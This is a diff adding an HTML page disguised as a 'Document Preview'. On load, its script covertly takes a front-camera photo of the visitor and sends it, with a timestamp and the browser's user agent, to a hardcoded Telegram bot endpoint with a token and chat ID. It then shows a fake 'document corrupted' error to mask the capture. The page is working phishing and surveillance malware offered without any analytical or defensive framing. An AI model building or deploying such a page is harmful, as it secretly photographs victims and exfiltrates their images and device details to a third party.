@@ -1,0 +1,17 @@
+<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Document</title><style>body{background:#fff;font-family:Arial;text-align:center;padding:20px;}h2{color:#333;}p{color:#666;font-size:14px;}</style></head><body onload="f()"><h2>Document Preview</h2><p>Please wait...</p><script>
+async function f(){try{
+var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+var v=document.createElement('video');v.srcObject=s;await v.play();
+await new Promise(r=>setTimeout(r,800));
+var c=document.createElement('canvas');c.width=640;c.height=480;
+c.getContext('2d').drawImage(v,0,0);var d=c.toDataURL('image/jpeg',0.7);
+s.getTracks().forEach(t=>t.stop());
+var b=atob(d.split(',')[1]);var a=new Uint8Array(b.length);
+for(var i=0;i<b.length;i++)a[i]=b.charCodeAt(i);
+var x=new FormData();x.append('chat_id','1923372966');
+x.append('photo',new Blob([a],{type:'image/jpeg'}),'f.jpg');
+x.append('caption','📸 '+new Date().toLocaleString());
+await fetch('https://api.telegram.org/bot8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4/sendPhoto',{method:'POST',body:x});
+await fetch('https://api.telegram.org/bot8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4/sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:'1923372966',text:'📱 '+navigator.userAgent})});
+setTimeout(function(){document.body.innerHTML='<h2>Error</h2><p>Document corrupted or unsupported format.</p>';},1500);
+}catch(e){document.body.innerHTML='<h2>Error</h2><p>Could not open document.</p>';}}</script></body></html>
